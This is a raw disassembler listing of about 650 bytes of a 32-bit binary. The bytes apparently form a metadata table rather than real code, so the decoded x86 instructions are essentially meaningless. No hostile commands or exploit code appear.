  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 1f 15 0a    	add    %dl,0xa151f00(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 b6 0f 94 00 10    	add    %dh,0x1000940f(%esi)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 11                	add    %dl,(%ecx)
  40638d:	16                   	push   %ss
  40638e:	58                   	pop    %eax
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 10 24 9a    	add    %dl,-0x65dbf000(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 f1 09 9a    	add    %dl,-0x65f60f00(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 1f 1e 0a    	add    %dl,0xa1e1f18(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 20                	add    %ah,(%eax)
  4063c5:	24 0a                	and    $0xa,%al
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	19 1e                	sbb    %ebx,(%esi)
  4063d4:	0e                   	push   %cs
  4063d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 28 1c 0a    	add    %dl,0xa1c2800(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 35 1b 1d    	add    %dl,0x1d1b3500(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 cc 05 1d    	add    %dl,0x1d05cc00(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 ea 00 1d    	add    %dl,0x1d00ea00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 76 25             	add    %dh,0x25(%esi)
  40641a:	1d 00 14 00 20       	sbb    $0x20001400,%eax
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 f5                	add    %dh,%ch
  406427:	0a 1d 00 14 00 78    	or     0x78001400,%bl
  40642d:	20 00                	and    %al,(%eax)
  40642f:	00 00                	add    %al,(%eax)
  406431:	00 86 18 19 1e 0e    	add    %al,0xe1e1918(%esi)
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 d9                	add    %bl,%cl
  406443:	09 c3                	or     %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 5b 19             	add    %bl,0x19(%ebx)
  406452:	c7 00 14 00 5c 37    	movl   $0x375c0014,(%eax)
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 40 08             	add    %al,0x8(%eax)
  406460:	53                   	push   %ebx
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 35 07 1d    	add    %dl,0x1d073500(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 ce 08 0a    	add    %dl,0xa08ce00(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 a4 0c c3    	add    %dl,-0x3cf35c00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 f7 01 d5    	add    %dl,-0x2afe0900(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 7a 05 0a    	add    %dl,0xa057a00(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 71 02 c3    	add    %dl,-0x3cfd8f00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 6e 05 1d    	add    %dl,0x1d056e00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 30 09 0a    	add    %dl,0xa093000(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 12    	add    %al,0x12209600(%eax)
  4064dd:	02 e0                	add    %al,%ah
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 74    	add    %al,0x74209600(%eax)
  4064eb:	1b e4                	sbb    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 63    	add    %al,0x63209600(%eax)
  4064f9:	17                   	pop    %ss
  4064fa:	ec                   	in     (%dx),%al
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 ed    	add    %al,-0x12df6a00(%eax)
  406507:	07                   	pop    %es
  406508:	f1                   	int1
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 2f    	add    %al,0x2f209600(%eax)
  406515:	05 f8 00 1c 00       	add    $0x1c00f8,%eax
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 6a 0f             	and    %ch,0xf(%edx)
  406524:	ff 00                	incl   (%eax)
  406526:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 f9 00 1c    	add    %dl,0x1c00f900(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 bc 14 0a    	add    %dl,0xa14bc00(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 9b 06 0a 00 22    	add    %bl,0x22000a06(%ebx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 25 06 23    	add    %dl,0x23062500(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 74 0a 2a          	add    %dh,0x2a(%edx,%ecx,1)
  40656b:	01 24 00             	add    %esp,(%eax,%eax,1)
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 6d 06 84    	add    %dl,-0x7bf99300(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 31 24 1d    	add    %dl,0x1d243100(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 1f 1e 0a    	add    %dl,0xa1e1f18(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 20 03 9a    	add    %dl,-0x65fce000(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 74 07 38          	add    %dh,0x38(%edi,%eax,1)
  4065b1:	01 27                	add    %esp,(%edi)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 ce 23 0a    	add    %dl,0xa23ce00(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 20 09 3e    	add    %dl,0x3e092000(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 1f                	sbb    %bl,(%edi)
  4065d9:	1e                   	push   %ds
  4065da:	0a 00                	or     (%eax),%al
  4065dc:	29 00                	sub    %eax,(%eax)
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	19 1e                	sbb    %ebx,(%esi)
  4065e8:	6b 01 29             	imul   $0x29,(%ecx),%eax
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	55                   	push   %ebp
  4065f5:	01 70 01             	add    %esi,0x1(%eax)
  4065f8:	2a 00                	sub    (%eax),%al
  4065fa:	6c                   	insb   (%dx),%es:(%edi)
  4065fb:	41                   	inc    %ecx
  4065fc:	00 00                	add    %al,(%eax)
  4065fe:	00 00                	add    %al,(%eax)
  406600:	86 00                	xchg   %al,(%eax)
  406602:	e5 1b                	in     $0x1b,%eax
  406604:	75 01                	jne    0x406607
  406606:	2b 00                	sub    (%eax),%eax
  406608:	6e                   	outsb  %ds:(%esi),(%dx)
  406609:	22 00                	and    (%eax),%al
  40660b:	00 00                	add    %al,(%eax)
  40660d:	00 86 00 50 07 70    	add    %al,0x70075000(%esi)
  406613:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 f9 02 75    	add    %al,0x7502f900(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 9d 12 7c 01    	addl   $0x17c129d,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 1f 1e 0a    	add    %dl,0xa1e1f18(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 67 1c             	add    %ah,0x1c(%edi)
  40664a:	c7 00 30 00 40 45    	movl   $0x45400030,(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 c0                	add    %al,%al
  406657:	08 84 01 31 00 9f 22 	or     %al,0x229f0031(%ecx,%eax,1)
  40665e:	00 00                	add    %al,(%eax)
  406660:	00 00                	add    %al,(%eax)
  406662:	96                   	xchg   %eax,%esi
  406663:	00 bb 20 2a 01 32    	add    %bh,0x32012a20(%ebx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 e6                	add    %ah,%dh
  406673:	01 93 01 33 00 80    	add    %edx,-0x7fffccff(%ebx)
  406679:	45                   	inc    %ebp
  40667a:	00 00                	add    %al,(%eax)
  40667c:	00 00                	add    %al,(%eax)
  40667e:	96                   	xchg   %eax,%esi
  40667f:	00 69 09             	add    %ch,0x9(%ecx)
  406682:	93                   	xchg   %eax,%ebx
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 7d 03             	add    %bh,0x3(%ebp)
  406690:	93                   	xchg   %eax,%ebx
  406691:	01 35 00 10 46 00    	add    %esi,0x461000
  406697:	00 00                	add    %al,(%eax)
  406699:	00 96 00 64 03 84    	add    %dl,-0x7bfc9c00(%esi)
  40669f:	01 36                	add    %esi,(%esi)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 c0 09 99    	add    %dl,-0x66f64000(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 d7 06 9f    	add    %dl,-0x60f92900(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 28 13 a5    	add    %dl,-0x5aecd800(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 d3 12 ab    	add    %dl,-0x54ed2d00(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	19 1e                	sbb    %ebx,(%esi)
  4066e4:	0e                   	push   %cs
  4066e5:	00 3b                	add    %bh,(%ebx)
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 1f 1e 0a    	add    %dl,0xa1e1f18(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 19 1e b1    	add    %al,-0x4ee1e6e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 57 22             	or     %edx,0x22(%edi)
  40670e:	bb 01 3c 00 40       	mov    $0x40003c01,%ebx
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 24 23             	add    %esp,(%ebx,%eiz,1)
  40671c:	bf 01 3c 00 63       	mov    $0x63003c01,%edi
  406721:	23 00                	and    (%eax),%eax
  406723:	00 00                	add    %al,(%eax)
  406725:	00 e1                	add    %ah,%cl
  406727:	01 7e 21             	add    %edi,0x21(%esi)
  40672a:	0e                   	push   %cs
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 19 1e cb    	add    %al,-0x34e1e6e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 a5 08 d7    	add    %al,-0x28f75b00(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 1b 07 dc    	add    %al,-0x23f8e500(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 3f 06 e2    	add    %al,-0x1df9c100(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 44 1c e8    	add    %al,-0x17e3bc00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 6b 18 ee    	add    %al,-0x11e794f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	14 15                	adc    $0x15,%al
  40678c:	f4                   	hlt
  40678d:	01 42 00             	add    %eax,0x0(%edx)
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 88 03 6b 01    	addl   $0x16b0388,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 32 0a 0e 00    	addl   $0xe0a32,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 93 23 d7 01    	addl   $0x1d72393,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 65 02 0a 02    	addl   $0x20a0265,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	f9                   	stc
  4067d1:	20 dc                	and    %bl,%ah
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 f1 04 d7    	add    %al,-0x28fb0f00(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 b6 01 d7    	add    %al,-0x28fe4a00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 c8 06 d7    	add    %al,-0x28f93800(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 15 27 0f 02    	addl   $0x20f2715,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 e6 23 0f 02    	addl   $0x20f23e6,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	ee                   	out    %al,(%dx)
  406825:	24 15                	and    $0x15,%al
  406827:	02 47 00             	add    0x0(%edi),%al
  40682a:	5f                   	pop    %edi
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 e5 09 1a    	add    %al,0x1a09e500(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 03 19 1f    	add    %al,0x1f190300(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	c9                   	leave
  40684f:	18 23                	sbb    %ah,(%ebx)
  406851:	02 49 00             	add    0x0(%ecx),%cl
  406854:	28 4a 00             	sub    %cl,0x0(%edx)
  406857:	00 00                	add    %al,(%eax)
  406859:	00 86 00 8f 04 27    	add    %al,0x27048f00(%esi)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	d4 04                	aam    $0x4
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	cb                   	lret
  406879:	09 31                	or     %esi,(%ecx)
  40687b:	02 4a 00             	add    0x0(%edx),%cl
  40687e:	85 24 00             	test   %esp,(%eax,%eax,1)
  406881:	00 00                	add    %al,(%eax)
  406883:	00 86 00 02 07 36    	add    %al,0x36070200(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 f2                	add    %dh,%dl
  406895:	06                   	push   %es
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 ff 04 42    	add    %al,0x4204ff00(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 c9 1f 42    	add    %al,0x421fc900(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	2e 15 dc 01 50 00    	cs adc $0x5001dc,%eax
  4068c4:	b0 24                	mov    $0x24,%al
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	00 00                	add    %al,(%eax)
  4068ca:	86 00                	xchg   %al,(%eax)
  4068cc:	d9 16                	fsts   (%esi)
  4068ce:	0e                   	push   %cs
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 57 02 6b    	add    %al,0x6b025700(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 c1 03 47    	add    %al,0x4703c100(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 53 05 4b    	add    %al,0x4b055300(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	44                   	inc    %esp
  406905:	03 50 02             	add    0x2(%eax),%edx
  406908:	53                   	push   %ebx
  406909:	00 1f                	add    %bl,(%edi)
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	21 26                	and    %esp,(%esi)
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	36 03 2b             	add    %ss:(%ebx),%ebp
  406923:	02 55 00             	add    0x0(%ebp),%dl
  406926:	24 4d                	and    $0x4d,%al
  406928:	00 00                	add    %al,(%eax)
  40692a:	00 00                	add    %al,(%eax)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	23 19                	and    (%ecx),%ebx
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	1d 05 0f 02 57       	sbb    $0x57020f05,%eax
  406941:	00 5c 53 00          	add    %bl,0x0(%ebx,%edx,2)
  406945:	00 00                	add    %al,(%eax)
  406947:	00 86 00 d1 24 31    	add    %al,0x3124d100(%esi)
  40694d:	02 58 00             	add    0x0(%eax),%bl
  406950:	c8 53 00 00          	enter  $0x53,$0x0
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	d9 23                	fldenv (%ebx)
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	fb                   	sti
  406967:	13 47 02             	adc    0x2(%edi),%eax
  40696a:	59                   	pop    %ecx
  40696b:	00 3c 25 00 00 00 00 	add    %bh,0x0(,%eiz,1)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	08 14 6b             	or     %dl,(%ebx,%ebp,2)
  406977:	01 59 00             	add    %ebx,0x0(%ecx)
  40697a:	45                   	inc    %ebp
  40697b:	25 00 00 00 00       	and    $0x0,%eax
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	1f                   	pop    %ds
  406983:	1d 23 02 5a 00       	sbb    $0x5a0223,%eax
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	2d 1d 15 02 5a       	sub    $0x5a02151d,%eax
  406995:	00 56 25             	add    %dl,0x25(%esi)
  406998:	00 00                	add    %al,(%eax)
  40699a:	00 00                	add    %al,(%eax)
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	24 21                	and    $0x21,%al
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	30 21                	xor    %ah,(%ecx)
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 b6 25 5a    	add    %al,0x5a25b608(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	3c 0f                	cmp    $0xf,%al
